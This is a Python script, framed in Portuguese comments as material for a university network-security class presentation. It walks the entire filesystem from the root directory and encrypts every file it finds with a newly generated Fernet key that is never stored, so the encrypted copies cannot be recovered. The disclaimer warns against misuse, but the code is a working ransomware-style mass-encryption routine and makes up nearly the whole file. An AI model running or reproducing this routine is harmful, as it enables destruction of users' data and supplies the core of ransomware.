#Este arquivo foi feito para fins educacionais, para uma apresentação na materia RCS(REDES DE COMPUTADORES E SEGURANÇA DA INFORMAÇÃO).
#Não deve ser usado para criptografar ou descriptografar dados confidenciais ou pessoais. 
#O uso inadequado deste código pode resultar na perda de dados importantes ou em violações de privacidade. 
#Use este código por sua própria conta e risco.

import os
from cryptography.fernet import Fernet

def encrypt_file(filename, key):
    # Criando o objeto Fernet com a chave fornecida
    f = Fernet(key)

    # Abrindo o arquivo para criptografar
    with open(filename, 'rb') as file:
        original = file.read()

    # Criptografando o conteúdo do arquivo
    encrypted = f.encrypt(original)

    # Escrevendo o conteúdo criptografado em um novo arquivo
    with open(filename + '.encrypted', 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

# Gerando uma chave para usar na criptografia
key = Fernet.generate_key()

# Lista de arquivos para criptografar
files_to_encrypt = []

# Percorrendo todos os diretórios e subdiretórios do computador
for root, directories, files in os.walk('/'):
    # Adicionando o caminho completo de cada arquivo na lista files_to_encrypt
    for filename in files:
        filepath = os.path.join(root, filename)
        files_to_encrypt.append(filepath)

# Criptografando cada arquivo da lista
for file in files_to_encrypt:
    encrypt_file(file, key)